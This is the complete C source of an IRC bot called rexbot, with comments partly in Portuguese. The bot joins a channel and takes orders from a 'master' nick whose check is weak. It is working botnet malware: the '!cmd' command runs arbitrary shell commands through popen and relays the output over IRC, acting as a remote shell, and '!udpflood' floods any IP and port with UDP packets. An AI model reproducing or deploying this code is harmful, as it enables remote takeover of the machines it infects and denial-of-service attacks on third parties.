/*
This is another irc BOT in C
to run follow this example; "gcc -o rexbot rexbot.c; ./rexBot ip port nick chan mestre"

   Author: Antonio Costa ,aka Cooler_
   contact: c00f3r[at]gmail[dot]com
   Co-author: Victor Ramos Mello aka m0nad
   contact: m0nad[at]email[dot]com

   Copyright 2007, 2008 by Antonio Costa. All Rights Reserved.

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/
#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>

#define BUF 1024

#define DEBUG_ON 1

#ifdef DEBUG_ON
#define SAY(f...) printf(f)
#else
#define SAY(f...)
#endif


struct user 
{
  char * name;
  char * dns;
  char * action;
  char * to;
  char * msg;
  int master;
};

struct irc
{
 int socket;
 int port;
 char * master;
 char * server;
 char * nick;
 char * chan;
 struct sockaddr_in in; 
};



//function from my Brother I4K the master of wizards
//from Orion-Socket API
int orion_getHostByName(const char* name, char* buffer)
{
    struct addrinfo hints, * res, * res0 = NULL;
    struct sockaddr_in * target = NULL;
    int error;
    char *tmp = NULL;
    
    memset(&hints, 0, sizeof(struct addrinfo));
    
    hints.ai_family = PF_UNSPEC;
    hints.ai_socktype = 0;
    error = getaddrinfo(name, "http", &hints, &res0);
    
    if (error)
    {
        if (res0)
            freeaddrinfo(res0);
        return error;
    }
    
    for (res = res0; res; res = res->ai_next)
    {
        target = (struct sockaddr_in *) res->ai_addr;
        if (target)
        {
            tmp = inet_ntoa(target->sin_addr);
            if (tmp && strlen(tmp))
            {
                strncpy(buffer, tmp, strlen(tmp));
                buffer[strlen(tmp)] = '\0';
                if (res0)
                    freeaddrinfo(res0);
                return 1;
            }
        }
    }
    
    freeaddrinfo(res0);
    
    return 0;
}
	
void 
initBot (struct irc * bot, char * serv, int port, char * nick, char * chan, char * master) 
{
  char server[BUF];
  orion_getHostByName(serv, server);
  bot->master = master;
  bot->port = port;
  bot->server = server;
  bot->nick = nick;
  bot->chan = chan;
}

// resposta para PING
void 
pong (struct irc * bot, char * rcv)
{
  const char * ping = "PING";
  int i;
  for  (i = 0; rcv[i] == ping[i] ; i++) {
    if (ping [i+1] == 0) {
      rcv[1] = 'O';  //s/^PING/PONG/
      SAY ("%s", rcv); 
      send (bot->socket, rcv, strlen(rcv), 0);//sendStr (bot, rcv);
      return;
    }
  }     
}
void
udpFlood (char *server, int port, int times)
{
  struct sockaddr_in sin;
  char serv [BUF], * word = "Boo";
  int sock;

//pegando IP
  orion_getHostByName(server,serv);

// setamos tudo para zero velho clichê blabla
  bzero((char *) &sin,sizeof(sin));

//host,port...
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(server);
  sin.sin_port = htons(port);

// olhe nosso dgram
  sock = socket(AF_INET, SOCK_DGRAM, 0);
  connect(sock,(struct sockaddr *) &sin, sizeof(sin));

//enviando flood ,"x" vezes
  do {
    send(sock, word, sizeof(word), 0);
    times--;
  } while (times^0);
}
void
chomp (char * str)
{
  while (*str) {
    if (*str == '\n' || *str == '\r') {
      *str = 0;
      return;
    }
    str++;
  }
}
 
char *
gettoken (char ** t, char delim, char * rcv)
{
  char * ptr_rcv = rcv;

  while (*ptr_rcv) {
    if (*ptr_rcv == delim) {
      *ptr_rcv++ = '\0';
      break;
    }
    ptr_rcv++;
  }
  *t = rcv;
  return ptr_rcv;
}

void
sendStr (struct irc * bot, char * str)
{
  send (bot->socket, str, strlen(str), 0);
}

void
sendMsg (struct irc * bot, char * msg)
{
  char msgbuf [BUF];
  snprintf (msgbuf, BUF-1, "PRIVMSG %s", msg);
  sendStr (bot, msgbuf);
}
void
sendMsgChan (struct irc * bot, char * msg)
{
  char msgbuf [BUF];
  snprintf (msgbuf, BUF-1, "#%s :%s", bot->chan, msg);
  sendMsg (bot, msgbuf);
}
void
sendMsgUser (struct irc * bot,char * to,  char * msg)
{
  char msgbuf [BUF];
  snprintf (msgbuf, BUF-1, "%s :%s", to, msg);
  sendMsg (bot, msgbuf);
}
void
sendHours (struct irc * bot)
{
  char msg [BUF];
  time_t agora = time (NULL);
  struct tm * ptr_tm = localtime (&agora);
  strftime (msg, BUF-1, "%H:%M:%S\n", ptr_tm); 
  sendMsgChan (bot, msg);
}
void
enterChan (struct irc * bot, char * chan)
{
  char msg [BUF];
  snprintf(msg, BUF-1, "JOIN %s\r\n", chan);
  sendStr (bot, msg);
}
void
exitServ (struct irc * bot)
{
  sendStr (bot, "QUIT\r\n");
  close (bot->socket);
  exit (0); 
}
void
sendUdpFlood (struct irc * bot, char * arg)
{
  char * next, * ip, * port_str, * qtd;
  int tam = 0, port_int = 0;
  next = gettoken (&ip, ' ', arg);
  next = gettoken (&port_str, ' ', next);
  next = gettoken (&qtd, ' ', next);
  chomp (ip); chomp (port_str); chomp (qtd);
  tam = atoi (qtd); port_int = atoi (port_str);
  SAY ("ip: %s :: port: %d :: qtd: %d \n", ip, port_int, tam);
  if (ip == NULL || port_int < 1 || port_int > 65535) {
    sendMsgChan (bot, "!udpflood ip porta tamanho\r\n");
    return; 
  } else
  if (tam < 1) 
    tam = 666;
  udpFlood (ip, port_int, tam);


}

void
execCmd (struct irc * bot, char * cmd)
{

  FILE * fpipe;
  char line [BUF];
  chomp (cmd);
  if ( !(fpipe = (FILE *)popen (cmd,"r")) ) {  
    sendMsgUser (bot, bot->master, "Problems with pipe");
    return;
  }
  while (fgets (line, sizeof line, fpipe)) {
    sendMsgUser (bot, bot->master, line);
    sleep (1); //flood =/
  }
  pclose(fpipe);

}
void
execOrder (struct irc * bot, int num, char * next)
{
  char * tmp;
  switch (num) {
    case 0: 
      sendMsgUser (bot, next, gettoken(&tmp , ' ', next)); 
      break;
    case 1: 
      sendMsgChan (bot, next); 
      break;
    case 2: 
      execCmd (bot, next);
      break;
    case 3:  
      sendHours (bot);
      break;
    case 4:
      enterChan (bot, next);
      break;
    case 5:
      exitServ (bot);
      break;
    case 6:
      sendUdpFlood (bot, next);
      break;
  }
}

void
parserOrder (struct irc * bot, char * rcv)
{
  int i, len;
  char * cmd, *next;
  char * cmds[7] = { "!say-to", "!say", "!cmd", "!hours", "!enter", "!exit", "!udpflood"}  ;
  
  if (*rcv == '!') { //is a command ?
    next = gettoken (&cmd, ' ', rcv);
    len = (int)(sizeof (cmds)/sizeof (char *));
    chomp (cmd);
    for (i = 0;i < len; i++) {
      if (strcmp (cmd, cmds[i]) == 0) {
        execOrder (bot, i, next);
      }
    }
  }
}

void
parser (struct irc * bot, char * rcv)
{
  int i = 0, len = strlen (rcv);
  char * next,* ptr_rcv = rcv;
  struct user usuario;
  if (*ptr_rcv == ':') { //is someone(not realy)

    for ( i = 0; i < len; i++) { //its realy someone (not realy :)
      if (ptr_rcv[i] == '!')
        break;
      if (ptr_rcv [i] == ' ')
        return;
    }

    next = gettoken (&usuario.name, '!', ++ptr_rcv);
    next = gettoken (&usuario.dns, ' ', ++next);
    next = gettoken (&usuario.action, ' ', next);
    next = gettoken (&usuario.to, ' ', next);
    next = gettoken (&usuario.msg, ':', ++next);
    SAY ("name : %s\n", usuario.name);
    SAY ("dns : %s\n", usuario.dns);
    SAY ("action : %s\n", usuario.action);
    SAY ("to : %s\n", usuario.to);
    SAY ("msg : %s", usuario.msg);
    if (strncmp (usuario.name, bot->master, strlen (usuario.name)) == 0) {
      usuario.master = 1;
      parserOrder (bot, usuario.msg);
    }
    else {
      usuario.master = 0;
    }
  
  }
  else {
    pong (bot, rcv);
  }
}


//recodeme
int
connectBot(struct irc * bot)
{
  char buff[BUF], recup[BUF];
		
  bot->socket = socket(AF_INET, SOCK_STREAM, 0);
  bot->in.sin_port = htons(bot->port);	
  bot->in.sin_family = AF_INET;
  bot->in.sin_addr.s_addr = inet_addr(bot->server);
	
  if (connect(bot->socket, (struct sockaddr *)&bot->in, sizeof(bot->in)) == -1) {
    puts ("[-]Error server");
    return -1;
  }
	
  snprintf (buff, BUF-1, "USER kitu ou pas :guest\r\nNICK %s\r\nJOIN #%s\r\n", bot->nick, bot->chan);
  send (bot->socket, buff, strlen(buff), 0);
	
  while(1) {
    memset (recup, 0, sizeof(recup));
    recv (bot->socket, recup, sizeof(recup), 0);
    printf ("%s", recup);
    parser(bot, recup);
  }	
  close(bot->socket);
  return 0;
}

int
main (int argc, char ** argv)
{
  struct irc * bot = malloc (sizeof (struct irc));

  if(argc < 6) {
    printf ("USO: ./%s ip porta nick canal mestre\n", argv[0]);
    return -1;
  }

  initBot(bot, argv[1],atoi(argv[2]), argv[3], argv[4], argv[5]);
  SAY ("%s %d %s %s\n", bot->server, bot->port, bot->nick, bot->chan);
  connectBot(bot);
  free (bot);
  return 0;
}

